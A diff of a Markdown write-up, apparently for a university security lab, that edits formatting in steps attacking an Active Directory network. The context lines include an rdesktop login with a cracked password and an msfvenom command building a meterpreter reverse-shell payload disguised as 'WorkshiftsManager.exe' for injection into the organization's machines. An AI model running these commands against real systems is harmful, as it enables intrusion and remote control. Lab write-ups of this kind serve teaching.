@@ -163,13 +163,13 @@ We will try to crack the `DNSoperator` password performing a so-called **AS-Rep 
 	==VERIFICARE CHE SI POSSA FARE DESKTOP REMOTO==
  
  5. **Open a remote connection to `SERVERDNS`:**
-To open a remote desktop connection, we use the following command:
+		To open a remote desktop connection, we use the following command:
 
     `rdesktop 10.0.2.250 -u DNSoperator -p Qwerty123 -d cybersec.units.it -r disk:share=~/Desktop/share`
 
 	Using the option `-r disk:share=~/Desktop/share` we can share the folder `share` between the Kali machine and the remote DNS/File Server, so we are able to easily move documents between the two devices.
  
- 6. **Generate of a payload for starting a reverse shell and inject it:**
+ 6. **Generate a payload for starting a reverse shell and inject it:**
 	In a different shell window, we now proceed with the generation of an exploit through which we will try to inject a `meterpreter` reverse shell client to the computers of the organization. For doing so, we run the following command on the Kali machine to generate a payload that launches the reverse shell client:
 
     `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=10.0.2.15 -b "\x00" -f exe -o ./Desktop/WorkshiftsManager.exe`
@@ -251,7 +251,7 @@ Other useful information about Active Directory have been retrieved from officia
 
 [^2]: `getsystem` requires the process to be run as administrator (to be "previously" authorized to run with high privileges, due to Windows UAC); then, it tries three techniques to achieve Privilege Escalation. More details [here](https://docs.rapid7.com/metasploit/meterpreter-getsystem/).
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEyMDc5NzE5MjQsOTc3OTEyNTE2LDQ5Mj
+eyJoaXN0b3J5IjpbLTE0OTIzMjIzODMsOTc3OTEyNTE2LDQ5Mj
 Y2NjQxNywtMTE5NTMwMjgzOCw2NDAwODkyOTksLTE3NDAxODc5
 NDEsLTEzNTE2OTYxMTgsNDg0MjU5MzAsLTE2NDc2ODc1OTIsMT
 A5OTkzMTc0MCwtMTI1MjU2MDcxNywxNDkyMjg2NjgzLDI4MDg0
